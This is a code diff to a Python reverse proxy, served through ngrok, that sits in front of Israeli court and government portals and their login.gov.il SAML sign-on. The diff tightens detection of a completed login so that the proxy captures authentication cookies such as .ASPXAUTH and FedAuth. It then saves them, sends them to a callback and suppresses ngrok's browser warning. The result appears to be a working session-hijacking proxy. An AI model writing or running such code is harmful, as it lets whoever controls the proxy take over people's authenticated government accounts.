@@ -51,7 +51,10 @@ P = PORTALS[portal_key]
 
 # ── shared state ──────────────────────────────────────────────────────────────
 _state = {"ready": False, "payload": None, "error": "",
-          "sent_ok": False, "cookies": {}}
+          "sent_ok": False, "cookies": {},
+          "visited_login": False,   # True once request went to login.gov.il
+          "posted_saml": False,     # True once browser POSTed SAMLResponse back to portal
+          }
 _done_evt  = threading.Event()
 _pw_ready  = threading.Event()
 OUT = Path(f"session_{portal_key}.json")
@@ -71,10 +74,11 @@ _PROXY_DOMAINS = {
     "eca.gov.il",
 }
 
-# Cookies from these domains signal a successful login
-_SESSION_COOKIE_NAMES = {
-    ".ASPXAUTH", "ASP.NET_SessionId", "JSESSIONID",
-    "authToken", "govil_session", "NGCS_Session",
+# Cookies that indicate ACTUAL authentication (not just session start)
+# ASP.NET_SessionId is excluded — it's created on any first visit
+_AUTH_COOKIE_NAMES = {
+    ".ASPXAUTH", "authToken", "govil_auth", "NGCS_Session",
+    "FedAuth", "FedAuth1", ".AspNet.Cookies",
 }
 
 _OUR_HOST = ""   # filled in at runtime from ngrok URL (set by app.py via env or arg)
@@ -119,8 +123,8 @@ def _rewrite_body(body: bytes, content_type: str) -> bytes:
     return text.encode('utf-8')
 
 def _check_login_success(cookies_dict: dict) -> bool:
-    names = {k.split('=')[0].strip() for k in cookies_dict}
-    return bool(names & _SESSION_COOKIE_NAMES)
+    names = {k.strip() for k in cookies_dict}
+    return bool(names & _AUTH_COOKIE_NAMES)
 
 def _build_payload_from_proxy() -> dict:
     import time as _t
@@ -236,26 +240,38 @@ class ProxyHandler(BaseHTTPRequestHandler):
         except Exception as e:
             self._html(502, f"<h2>Proxy error</h2><pre>{e}</pre>"); return
 
-        # Capture & collect cookies
+        # Track flow stages
+        if 'login.gov.il' in host:
+            _state["visited_login"] = True
+        # SAMLResponse POST back to the portal means login just completed
+        portal_domains = ("court.gov.il", "sides.rbc.gov.il", "publicsso.eca.gov.il")
+        if (method == "POST" and any(d in host for d in portal_domains)
+                and b"SAMLResponse" in req_body):
+            _state["posted_saml"] = True
+
+        # Capture & collect cookies (keyed by cookie name)
         for ck in (rh.get_all('Set-Cookie') or []):
             name = ck.split('=')[0].strip()
             _state["cookies"][name] = ck
 
-        # Detect successful login: session cookie appeared + location going to portal
+        # Detect successful login ONLY after:
+        # 1. Jeremy was redirected to login.gov.il (visited_login)
+        # 2. SAMLResponse was POSTed back to the portal (posted_saml)
+        # 3. Auth cookies are now present
         location = rh.get('Location', '')
-        if location and not _state["ready"]:
-            for domain in ("court.gov.il", "sides.rbc.gov.il", "publicsso.eca.gov.il"):
-                if domain in location and _check_login_success(_state["cookies"]):
-                    payload = _build_payload_from_proxy()
-                    _state["payload"] = payload; _state["ready"] = True
-                    OUT.write_text(json.dumps(payload, ensure_ascii=False, indent=2),
-                                   encoding="utf-8")
-                    threading.Thread(target=_send_to_callback, args=(payload,), daemon=True).start()
-                    # Override redirect to show our "done" page
-                    self.send_response(302)
-                    self.send_header("Location", "/done_proxy")
-                    self.send_header("ngrok-skip-browser-warning","1")
-                    self.end_headers(); return
+        if (not _state["ready"]
+                and _state["visited_login"]
+                and _state["posted_saml"]
+                and _check_login_success(_state["cookies"])):
+            payload = _build_payload_from_proxy()
+            _state["payload"] = payload; _state["ready"] = True
+            OUT.write_text(json.dumps(payload, ensure_ascii=False, indent=2),
+                           encoding="utf-8")
+            threading.Thread(target=_send_to_callback, args=(payload,), daemon=True).start()
+            self.send_response(302)
+            self.send_header("Location", "/done_proxy")
+            self.send_header("ngrok-skip-browser-warning","1")
+            self.end_headers(); return
 
         # Decompress body
         enc = rh.get('Content-Encoding','')
